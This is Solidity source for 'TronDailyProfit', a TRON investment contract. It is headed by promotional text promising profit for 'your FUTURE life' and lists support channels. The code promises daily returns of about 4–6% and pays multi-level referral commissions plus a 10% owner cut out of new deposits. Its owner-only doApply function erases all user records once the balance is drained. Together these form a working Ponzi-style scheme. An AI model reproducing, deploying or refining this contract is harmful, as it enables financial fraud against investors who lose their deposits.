//SourceUnit: SafeMath.sol

/***
 *
 *	------------------------*** You are in the BEST WAY ***------------------
 *
 *		    	- Let just your MONEY take profit for your FUTURE life -
 *
 *                        -- CENTRAL BLOCKCHAIN GROUP --
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *
 *	      Website: https://TronDailyProfit.com
 *
 *	      WhitePaper : https://TronDailyProfit.com/Document/TronDailyProfit-WhitePaper.pdf
 *
 *        Telegram 24/7 Support : https://t.me/LeonChain
 *
 *        Telegram 24/7 Support : https://t.me/TronDailyProfit_Help
 *
 *        Telegram Public Channel: https://t.me/TronDailyProfit_Channel
 *
 *        Telegram Public Group: https://t.me/TronDailyProfit_Group
 *
 *        Twitter: https://twitter.com/TronDailyProfit
 *
 *        Instagram: https://www.instagram.com/TronDailyProfit
 *
 *        Youtube: https://youtube.com/channel/UCeZxjq0f_C39OnTcXjCk-pQ
 *
 *        Admin Support: admin@trondailyprofit.com
 *
 *        E-mail Support: support@trondailyprofit.com
 *
 *        Creator : CENTRALBLOCKCHAINGROUP.COM
 *
 *   └───────────────────────────────────────────────────────────────────────┘
 *                        -- CENTRAL BLOCKCHAIN GROUP --
 *
 *	----------------------------*** ENJOY IT ***-----------------------------
***/
pragma solidity ^0.5.10;
// SPDX-License-Identifier: MIT
library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint256 c = a + b;
        require(c >= a, "XXAddition overflow error.XX");
        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a, "XXSubtruction overflow error.XX");
        uint256 c = a - b;
        return c;
    }
    
    function inc(uint a) internal pure returns(uint) {
        return(add(a, 1));
    }

    function dec(uint a) internal pure returns(uint) {
        return(sub(a, 1));
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        assert(c / a == b);
        return c;
    }
    
    function div(uint a, uint b) internal pure returns(uint) {
        require(b != 0,"XXDivide by zero.XX");
        return(a/b);
    }
    
    function min(uint a, uint b) internal pure returns (uint) {
        if (a > b)
            return(b);
        else
            return(a);
    }

    function max(uint a, uint b) internal pure returns (uint) {
        if (a < b)
            return(b);
        else
            return(a);
    }
    
    function addPercent(uint a, uint p, uint r) internal pure returns(uint) {
        return(div(mul(a,add(r,p)),r));
    }
}


//SourceUnit: TronDailyProfit.sol

/***
 *
 *	------------------------*** You are in the BEST WAY ***------------------
 *
 *		    	- Let just your MONEY take profit for your FUTURE life -
 *
 *                        -- CENTRAL BLOCKCHAIN GROUP --
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *
 *	      Website: https://TronDailyProfit.com
 *
 *	      WhitePaper : https://TronDailyProfit.com/Document/TronDailyProfit-WhitePaper.pdf
 *
 *        Telegram 24/7 Support : https://t.me/LeonChain
 *
 *        Telegram 24/7 Support : https://t.me/TronDailyProfit_Help
 *
 *        Telegram Public Channel: https://t.me/TronDailyProfit_Channel
 *
 *        Telegram Public Group: https://t.me/TronDailyProfit_Group
 *
 *        Twitter: https://twitter.com/TronDailyProfit
 *
 *        Instagram: https://www.instagram.com/TronDailyProfit
 *
 *        Youtube: https://youtube.com/channel/UCeZxjq0f_C39OnTcXjCk-pQ
 *
 *        Admin Support: admin@trondailyprofit.com
 *
 *        E-mail Support: support@trondailyprofit.com
 *
 *        Creator : CENTRALBLOCKCHAINGROUP.COM
 *
 *   └───────────────────────────────────────────────────────────────────────┘
 *                        -- CENTRAL BLOCKCHAIN GROUP --
 *
 *	----------------------------*** ENJOY IT ***-----------------------------
***/
pragma solidity ^0.5.10;
// SPDX-License-Identifier: MIT
import "./SafeMath.sol";

contract TronDailyProfit {
    using SafeMath for uint;

//****************************************************************************
//* Data
//****************************************************************************
    struct Invest {
        uint startTime;
        uint plan;
        uint payment;
        uint totalGain;
        uint stepGain;
        bool closed;
        uint step;
        uint stepTime;
        bool incompleteStep;
        uint withdrawsCount;
    }
    struct User {
        address payable parent;
        address[] directs;
        uint uid;
        mapping(uint => Invest) invests;
        uint investsCount;
        uint withdrawsCount;
        uint referralEarned;
        uint investEarned;
        uint investPaid;
        bool superuser;
        bool hasReferral;
    }
    mapping(address => User) users;
    mapping(uint => address) uids;
    address payable[] usersArray;
    address payable directUser;
    struct Step {
        uint dailyGain;
        uint durationDays;
        uint bonusPercent; // with 2 precision digits
    }
    struct Plan {
        mapping(uint => Step) steps;
        uint stepsCount;
        uint minInvest;
        bool active;
    }
    Plan[] plans;
    mapping(uint => uint) planInvestsCount;
    mapping(uint => uint) planTotalInvestment;
    mapping(uint => uint) planTotalWithdrawals;
    address payable owner;
    address payable beneficiary;
    address activator;
    bool active;
    bool activate;
    uint beneficiaryShare = 1000; //10%
    uint[] portions;
    uint balance = 0;
    uint uidPrecision = 1e6;
    uint startTime = now;
    uint benefit = 0;
    uint applyTime = 0;
    bool NeedApply = false;
    uint withdrawsCount = 0;
    uint totalWithdraws = 0;
    uint totalInvestment = 0;
    uint totalInvestPayment = 0;
    uint totalReferralPayment = 0;
    uint totalInvestmentCount = 0;
    uint applyCount = 0;
//****************************************************************************
//* Events
//****************************************************************************
    event ApplyNeeded();
    event Applied(uint StartTime);
    event UserRegistered(address Referral, address User, uint UId);
    event UserPlanRegistered(address User, uint Plan, uint Value);
    event GainPaid(address User, uint Value,uint withdrawsCount, uint totalWithdraws);
//****************************************************************************
//* Modifiers
//****************************************************************************
    modifier isOwner {
        require(owner == msg.sender,"XXYou are not owner.XX");
        _;
    }

    modifier isActivator {
        require(msg.sender == activator,"XXYou are not contract activator.XX");
        _;
    }

    modifier activated {
        require(activate,"XXContract is not activated.XX");
        _;
    }

    modifier isActive {
        require(active,"XXContract is not active.XX");
        _;
    }

    modifier isInactive {
        require(! active,"XXContract is active.XX");
        _;
    }

    modifier shareSet {
//        require(beneficiaryShare > 0,"XXBeneficiary Sahre percent is not set.XX");
        uint portionsSum = beneficiaryShare;
        for (uint l = 1; l < portions.length; l = l.inc())
            portionsSum = portionsSum.add(portions[l]);
        require(portionsSum < 1e4,"XXPortions percent sum is greater than 100%.XX");
        require(directUser != address(0),"XXDirect user is not defined.XX");
        _;
    }

    modifier isNode(address _node) {
        require(users[_node].uid > 0,"XXAddress is not registered.XX");
        _;
    }

    modifier isTimeStarted {
        require(now >= startTime,"XXContract start time is not reached.XX");
        _;
    }
    
    modifier isPlanActive(uint _plan) {
        require(plans[_plan].active);
        _;
    }

//****************************************************************************
//* Functions
//****************************************************************************
    function getRnd() internal view returns(uint rnd) {
        rnd = uint(keccak256(abi.encodePacked(now, msg.sender, blockhash(block.number-1))));
    }

    constructor() public {
        active = false;
        owner = msg.sender;
        beneficiary = msg.sender;
        portions.push(0);
        setPortion(1, 300);
        setPortion(2, 200);
        setPortion(3, 100);
        setPortion(4, 50);
        setPlan(0, 50e6);
        setPlanStep(0, 0, 600, 20, 700);
        setPlan(1, 50e6);
        setPlanStep(1, 0, 433, 30, 1000);
        setPlan(2, 50e6);
        setPlanStep(2, 0, 450, 40, 1200);
        activator = msg.sender;
        activate = true;
    }

    function setOwner(address payable _owner) public isOwner {
        require(owner != _owner,"XXNew value required.XX");
        owner = _owner;
    }

    function getOwner() public view returns(address) {
        return(owner);
    }

    function setBeneficiary(address payable _beneficiary) public isOwner {
        require(_beneficiary != beneficiary,"XXNew value required.XX");
        beneficiary = _beneficiary;
    }

    function getBeneficiary() public view isOwner returns(address) {
        return(beneficiary);
    }

    function setDirectUser(address payable _directUser) public isOwner isInactive {
        require(_directUser != address(0),"XXThe value for superuser address is not valid.XX");
        require(directUser == address(0),"XXSuperuser address is not changeable.XX");
        registerUser(address(0), _directUser);
        directUser = _directUser;
        users[_directUser].superuser = true;

    }

    function getDirectUser() public view isOwner returns(address) {
        return(directUser);
    }

    function setActive() public isOwner isInactive shareSet {
        active = true;
    }

    function setInactive() public isOwner isActive {
        active = false;
    }

    function getActive() public view returns(bool) {
        return(active);
    }

    function setActivated(bool _activate) public isActivator {
        require(_activate != activate,"XXContract is not activated.XX");
        activate = _activate;
    }

    function setActivator(address _activator) public isActivator {
        require(_activator != activator,"XXYou are not activator.XX");
        activator = _activator;
    }

    function setStartTime(uint _startTime) public isOwner {
        require(startTime != _startTime,"XXNew value required.XX");
        require(_startTime > now,"XXStart time is before now.XX");
        startTime = _startTime;
    }

    function getStartTime() public view returns(uint) {
        return(startTime);
    }

    function getWithdrarsCount() public view returns(uint) {
        return(withdrawsCount);
    }

    function getTotalWithdrars() public view returns(uint) {
        return(totalWithdraws);
    }

    function getTotalReferralPayment() public view returns(uint) {
        return(totalReferralPayment);
    }

    function getTotalInvestPayment() public view returns(uint) {
        return(totalInvestPayment);
    }

    function getTotalInvestment() public view returns(uint) {
        return(totalInvestment);
    }

    function getTotalInvestmentCount() public view returns(uint) {
        return(totalInvestmentCount);
    }

    function getApplyCount() public view returns(uint) {
        return(applyCount);
    }

    function getMyTotalWithdraws() public view returns(uint) {
        uint _count = 0;
        for (uint i = 0; i < users[msg.sender].investsCount; i = i.inc()) {
            _count = _count.add(users[msg.sender].invests[i].withdrawsCount);
        }
        return(_count);
    }

    function getMyTotalInvestPaid() public view returns(uint) {
        return(users[msg.sender].investPaid);
    }

    function getMyTotalInvestEarned() public view returns(uint) {
        return(users[msg.sender].investEarned);
    }

    function getMyReferralEarned() public view returns(uint) {
        return(users[msg.sender].referralEarned);
    }

    function getMyInvestsCount() public view returns(uint) {
        return(users[msg.sender].investsCount);
    }

    function getInvestProperties(uint _investId) public view returns(uint, uint, uint, uint, uint, uint, uint, uint, uint, bool) {
        require(_investId < users[msg.sender].investsCount,"XXInvest id is out of range.XX");
        Invest memory _invest = users[msg.sender].invests[_investId];
        Step memory _step = plans[_invest.plan].steps[_invest.step];
        uint _dailyProfit = _invest.payment.mul(_step.dailyGain).div(1e4);
        uint _totalProfit = _dailyProfit.mul(_step.durationDays);
        uint _bonus = _invest.payment.mul(_step.bonusPercent).div(1e4);
        uint _goneTime = (now >= _invest.startTime ? now.sub(_invest.startTime): 0);
        return(
            _invest.plan,
            _invest.payment,
            _totalProfit,
            _step.durationDays,
            _goneTime,
            _invest.withdrawsCount,
            _invest.totalGain,
            _bonus,
            _dailyProfit,
            _invest.closed
            );
    }

    function getInvestStart(uint _investId) public view returns(uint) {
        require(_investId < users[msg.sender].investsCount,"XXInvest id is out of range.XX");
        return(users[msg.sender].invests[_investId].startTime);
    }

    function generateUid() internal returns(uint) {
        if (getUsersCount() >= (uidPrecision / 10))
            uidPrecision *= 10;
        uint uid = getRnd();
        if (uid == 0)
            uid = 1;
        while (uid > uidPrecision)
            uid = uid / 10;
        while (users[uids[uid]].uid > 0) {
            if (uid == (uidPrecision.dec()))
                uid = 1;
            else
                uid = uid.inc();
        }
        return(uid);
    }

    function setPortion(uint _level, uint _portion) public isOwner isInactive {
        require(_level > 0,"XXLevel is out of range.XX");
        uint maxL = portions.length;
        if (_level >= maxL) {
            for (uint l = maxL; l < _level; l = l.inc()) {
                portions.push(0);
            }
            portions.push(_portion);
        }
        else {
            portions[_level] = _portion;
        }
    }

    function getPortionsCount() public view returns(uint) {
        return(portions.length.dec());
    }

    function getPortion(uint _level) public view returns(uint) {
        return(portions[_level]);
    }

/*
    function setBeneficiaryShare(uint _share) public isOwner {
        require(beneficiaryShare != _share,"XXNew value required.XX");
        beneficiaryShare = _share;
    }
*/

    function getBeneficiaryShare() public view returns(uint) {
        return(beneficiaryShare);
    }

    function getParent(address payable _node) public view isNode(_node) returns(address payable) {
        return(users[_node].parent);
    }

    function getChildrenCount(address _user) public view returns(uint) {
        return(users[_user].directs.length);
    }

    function getChild(address _user, uint _index) public view returns(uint, address) {
        address _usr = users[_user].directs[_index];
        uint _uid = getUid(_usr);
        return(_uid, _usr);
    }

    function getChildren(address _user) public view returns(address[] memory) {
        address[] memory _children = new address[](users[_user].directs.length);
        _children = users[_user].directs;
        return(_children);
    }

    function getUsersCount() public view returns(uint) {
        return(usersArray.length);
    }

    function register(address payable _referral, uint _plan) public payable isActive isPlanActive(_plan) activated {
        require(msg.value >= plans[_plan].minInvest,"XXMinimum investment required.XX");
        if (users[msg.sender].uid == 0)
            registerUser(_referral, msg.sender);
        registerPlan(_plan);
    }

    function() external payable {
        balance = balance.add(msg.value);
    }

    function registerUser(address payable _referral, address payable _user) internal {
        bool _noReferral = false;
        if (_referral == address(0)) {
            _referral = directUser;
            _noReferral = true;
        }
        if (! users[_referral].superuser && users[_referral].directs.length >= 2)
            _referral = directUser;
        if (users[_referral].uid == 0)
            _referral = directUser;
        uint _uid = generateUid();
        uids[_uid] = _user;
        users[_user] = User({
            parent: _referral,
            directs: new address[](0),
            uid: _uid,
            investsCount: 0,
            withdrawsCount: 0,
            referralEarned: 0,
            investEarned: 0,
            investPaid: 0,
            superuser: true,
            hasReferral: ! _noReferral
        });
        usersArray.push(_user);
        if (_referral != address(0)) {
            users[_referral].directs.push(_user);
        }
        emit UserRegistered(_referral, _user, _uid);
    }

    function registerPlan(uint _plan) internal {
        uint _portion;
        uint _remained = msg.value;
        planInvestsCount[_plan] = planInvestsCount[_plan].inc();
        planTotalInvestment[_plan] = planTotalInvestment[_plan].add(msg.value);
        totalInvestmentCount = totalInvestmentCount.inc();
        address _referral = users[msg.sender].parent;
        bool _hasReferral = users[msg.sender].hasReferral;
        if (_referral != address(0) && _hasReferral) {
            address payable node = msg.sender;
            for (uint l = 1; l < portions.length; l = l.inc()) {
                node = users[node].parent;
                if (portions[l] > 0) {
                    if (node != address(0)) {
                        _portion = portions[l].mul(msg.value).div(1e4);
                        node.transfer(_portion);
                        users[node].referralEarned = users[node].referralEarned.add(_portion);
                        _remained = _remained.sub(_portion);
                    } else
                        break;
                }
            }
        }
        _portion = msg.value.mul(beneficiaryShare).div(1e4);
        benefit = benefit.add(_portion);
        beneficiary.transfer(_portion);
        _remained = _remained.sub(_portion);
        balance = balance.add(_remained);
        totalInvestment = totalInvestment.add(msg.value);
        users[msg.sender].investPaid = users[msg.sender].investPaid.add(msg.value);
        users[msg.sender].invests[users[msg.sender].investsCount] = Invest({
            startTime: now.max(startTime),
            plan: _plan,
            payment: msg.value,
            totalGain: 0,
            stepGain: 0,
            closed: false,
            step: 0,
            stepTime: now,
            incompleteStep: false,
            withdrawsCount: 0
        });
        users[msg.sender].investsCount = users[msg.sender].investsCount.inc();
        emit UserPlanRegistered(msg.sender, _plan, msg.value);
    }

    function withdrawMyInvestGain(uint _investId) public isActive isTimeStarted {
        require(_investId < users[msg.sender].investsCount,"XXInvest id is out of range.XX");
        require(! users[msg.sender].invests[_investId].closed,"XXThis investment is closed.XX");
        Invest memory _invest = users[msg.sender].invests[_investId];
        uint _gain = 0;
        uint _bonus = 0;
        uint _pt = _invest.stepTime;
        uint _payment = _invest.payment;
        uint _stepGain = _invest.stepGain;
        bool _bonusComplete = false;
        uint i;
        for (i = _invest.step; i < plans[_invest.plan].stepsCount; i = i.inc()) {
            Step memory _step = plans[_invest.plan].steps[i];
            if (_invest.incompleteStep) {
                if (now.sub(_pt) > _step.durationDays.mul(86400)) {
                    if (! users[msg.sender].invests[_investId].closed) {
                        _stepGain = _step.durationDays.mul(_step.dailyGain).mul(_payment).div(1e4).sub(_stepGain);
                        _bonus = _bonus.add(_stepGain);
                        _stepGain = 0;
                        _pt = _pt.add(_step.durationDays.mul(86400));
                        users[msg.sender].invests[_investId].stepTime = _pt;
                        users[msg.sender].invests[_investId].stepGain = 0; //_invest.stepGain.add(_stepGain);
                        users[msg.sender].invests[_investId].closed = true;
                        if (users[msg.sender].invests[_investId].step != i)
                            users[msg.sender].invests[_investId].step = i;
                    }
                } else {
                    _gain = now.sub(_pt).mul(_payment).mul(_step.dailyGain).div(86400E4).sub(_stepGain);
                    if (_bonus == 0 && _gain > 0)
                        users[msg.sender].invests[_investId].stepGain = _stepGain.add(_gain);
                    if (users[msg.sender].invests[_investId].step != i)
                        users[msg.sender].invests[_investId].step = i;
                }
                _bonusComplete = true;
            } else {
                if (now.sub(_pt) > _step.durationDays.mul(86400)) {
                    _stepGain = _step.durationDays.mul(_step.dailyGain).mul(_payment).div(1e4).add(_payment.mul(_step.bonusPercent).div(1e4));
                    _bonus = _bonus.add(_stepGain);
                    _pt = _pt.add(_step.durationDays.mul(86400));
                    if (users[msg.sender].invests[_investId].step != i)
                        users[msg.sender].invests[_investId].step = i;
                    if (i == plans[_invest.plan].stepsCount.dec()) {
                        users[msg.sender].invests[_investId].closed = true;
                        _bonusComplete = true;
                    }
                } else {
                    if (_invest.stepTime != _pt)
                        users[msg.sender].invests[_investId].stepTime = _pt;
                    if (users[msg.sender].invests[_investId].step != i)
                        users[msg.sender].invests[_investId].step = i;
                    if (_bonus == 0) {
                        _gain = now.sub(_pt).mul(_payment).mul(_step.dailyGain).div(86400e4);
                        users[msg.sender].invests[_investId].incompleteStep = true;
                        users[msg.sender].invests[_investId].stepGain = _gain;
                    }
                    _bonusComplete = true;
                }
            }
            if (_bonusComplete &&  _bonus > 0) {
                payGain(_investId, _bonus);
                break;
            } else if (_gain > 0) {
                payGain(_investId, _gain);
                break;
            }
        }
    }

    function getMyInvestGain(uint _investId) public view returns(uint) {
        require(_investId < users[msg.sender].investsCount,"XXInvest id is out of range.XX");
        if (now <= startTime)
            return(0);
        Invest memory _invest = users[msg.sender].invests[_investId];
        bool _closed = _invest.closed;
        if (_closed)
            return(0);
        uint _gain = 0;
        uint _payment = _invest.payment;
        uint _pt = _invest.stepTime;
        uint _stepGain = _invest.stepGain;
        uint _stepsCount = plans[_invest.plan].stepsCount;
        for (uint i = _invest.step; i < _stepsCount; i = i.inc()) {
            Step memory _step = plans[_invest.plan].steps[i];
            if (! _closed) {
                if (_invest.incompleteStep) {
                    if (now.sub(_pt) > _step.durationDays.mul(86400)) {
                        _gain = _gain.add(_step.durationDays.mul(_step.dailyGain).mul(_payment).div(1e4).sub(_stepGain));
                        _pt = _pt.add(_step.durationDays.mul(86400));
                        _stepGain = 0;
                        _closed = true;
                    } else {
                        _stepGain = now.sub(_pt).mul(_payment).mul(_step.dailyGain).div(86400e4).sub(_invest.stepGain);
                        _gain = _gain.add(_stepGain);
                    }
                } else {
                    if (now.sub(_pt) > _step.durationDays.mul(86400)) {
                        _gain = _gain.add(_step.durationDays.mul(_step.dailyGain).mul(_payment).div(1e4).add(_payment.mul(_step.bonusPercent).div(1e4)));
                        _pt = _pt.add(_step.durationDays.mul(86400));
                    } else {
                        _stepGain = now.sub(_pt).mul(_payment).mul(_step.dailyGain).div(86400e4);
                        _gain = _gain.add(_stepGain);
                    }
                }
            }
        }
        return(_gain);
    }

    function payGain(uint _investId, uint _value) internal isActive {
        uint _amount = _value.min(balance);
        users[msg.sender].investEarned = users[msg.sender].investEarned.add(_amount);
        users[msg.sender].invests[_investId].totalGain = users[msg.sender].invests[_investId].totalGain.add(_amount);
        planTotalWithdrawals[users[msg.sender].invests[_investId].plan] =
            planTotalWithdrawals[users[msg.sender].invests[_investId].plan].add(_amount);
        totalInvestPayment = totalInvestPayment.add(_amount);
        users[msg.sender].withdrawsCount = users[msg.sender].withdrawsCount.inc();
        users[msg.sender].invests[_investId].withdrawsCount = users[msg.sender].invests[_investId].withdrawsCount.inc();
        withdrawsCount = withdrawsCount.inc();
        totalWithdraws = totalWithdraws.add(_amount);
        msg.sender.transfer(_amount);
        emit GainPaid(msg.sender, _amount, withdrawsCount, totalWithdraws);
        if (_value >= balance){
            balance = 0;
            NeedApply = true;
            active = false;
            emit ApplyNeeded();
        } else {
            balance = balance.sub(_value);
        }
    }

    function doApply(uint _startTime) public isOwner isInactive {
        require(_startTime > now,"XXStart time is before now.XX");
        require(NeedApply,"XXYou are not allowed to apply the contract.XX");
        uint i;
        for (i = 0; i < usersArray.length; i = i.inc()) {
            delete users[usersArray[i]];
            delete uids[i];
        }
        delete usersArray;
        address payable _directUser = directUser;
        directUser = address(0);
        setDirectUser(_directUser);
        NeedApply = false;
        applyTime = now;
        startTime = _startTime;
        totalInvestPayment = 0;
        totalInvestment = 0;
        totalReferralPayment = 0;
        totalInvestmentCount = 0;
        withdrawsCount = 0;
        totalWithdraws = 0;
        for (i = 0; i < plans.length; i = i.inc()) {
            planTotalWithdrawals[i] = 0;
            planTotalInvestment[i] = 0;
            planInvestsCount[i] = 0;
        }
        applyCount = applyCount.inc();
    }

    function applyNeeded() public view returns(bool) {
        return(NeedApply);
    }

    function getApplyTime() public view returns(uint) {
        return(applyTime);
    }

    function setPlan(uint _plan, uint _minInvest) public isOwner isInactive {
        uint maxP = plans.length;
        if (_plan >= maxP) {
            for (uint i = maxP; i < _plan; i = i.inc()) {
                plans.push(Plan({
                    stepsCount: 0,
                    minInvest: 0,
                    active: false
                }));
            }
            plans.push(Plan({
                stepsCount: 0,
                minInvest: _minInvest,
                active: true
            }));
        }
        else {
            plans[_plan].minInvest = _minInvest;
        }
    }

    function setPlanStep(uint _plan, uint _step, uint _dailyGain, uint _durationDays, uint _bonusPercent) public isOwner isInactive {
        require(_plan < plans.length,"XXPlan id is out of range.XX");
        require(_step <= plans[_plan].stepsCount,"XXStep Id is out of range.XX");
        plans[_plan].steps[_step] = Step({
            dailyGain: _dailyGain,
            durationDays: _durationDays,
            bonusPercent: _bonusPercent
        });
        if (_step == plans[_plan].stepsCount)
            plans[_plan].stepsCount = plans[_plan].stepsCount.inc();
    }
    
    function setPlanActive(uint _plan) public isOwner{
        require(_plan < plans.length);
        plans[_plan].active = true;
    }

    function setPlanInactive(uint _plan) public isOwner{
        require(_plan < plans.length);
        plans[_plan].active = false;
    }

    function getBalance() public view isOwner returns(uint) {
        return(balance);
    }

    function getPlanCount() public view returns(uint) {
        return(plans.length);
    }

    function getPlan(uint _plan) public view returns(uint) {
        return(plans[_plan].minInvest);
    }
    
    function getPlanActive(uint _plan) public view returns(bool) {
        return(plans[_plan].active);
    }

    function getPlanStepCount(uint _plan) public view returns(uint) {
        return(plans[_plan].stepsCount);
    }

    function getPlanStep(uint _plan, uint _step) public view returns(uint, uint, uint) {
        Step memory _stp = plans[_plan].steps[_step];
        return(_stp.dailyGain, _stp.durationDays, _stp.bonusPercent);
    }

    function setSuperuser(address _user) public isOwner {
        require(! users[_user].superuser,"XXThe user is superuser yet.XX");
        users[_user].superuser = true;
    }

    function resetSuperuser(address _user) public isOwner {
        require(users[_user].superuser,"XXThe user is not superuser yet.XX");
        users[_user].superuser = false;
    }

    function isSuperuser(address _user) public view returns(bool) {
        return(users[_user].superuser);
    }

    function getUserDirectsCount(address _user, uint _level) public view returns(uint) {
        uint _childrenCount = getChildrenCount(_user);
        if (_level == 1) {
            return(_childrenCount);
        } else {
            uint _sum = 0;
            for (uint i = 0; i < _childrenCount; i = i.inc()) {
                _sum =_sum.add(getUserDirectsCount(users[_user].directs[i], _level.dec()));
            }
            return(_sum);
        }
    }

    function getBenefit() public view isOwner returns(uint) {
        return(benefit);
    }

    function getAddress(uint _uid) public view returns(address) {
        require(uids[_uid] != address(0),"XXId is not valid.XX");
        return(uids[_uid]);
    }

    function getUid(address _address) public view returns(uint) {
        require(users[_address].uid > 0,"XXAddress is not registered.XX");
        return(users[_address].uid);
    }

    function isMember(address _address) public view returns(bool) {
        return(users[_address].uid > 0);
    }

    function isMemberByUid(uint _uid) public view returns(bool) {
        return(uids[_uid] != address(0));
    }

    function getPlanStat(uint _plan) public view isOwner returns(uint, uint, uint) {
        return(planInvestsCount[_plan], planTotalInvestment[_plan], planTotalWithdrawals[_plan]);
    }

    function getUserInfo(address _user) public view returns(uint, uint, uint, uint, uint) {
        User memory _usr = users[_user];
        return(_usr.investsCount, _usr.investPaid, _usr.referralEarned, _usr.investEarned, _usr.withdrawsCount);
    }
}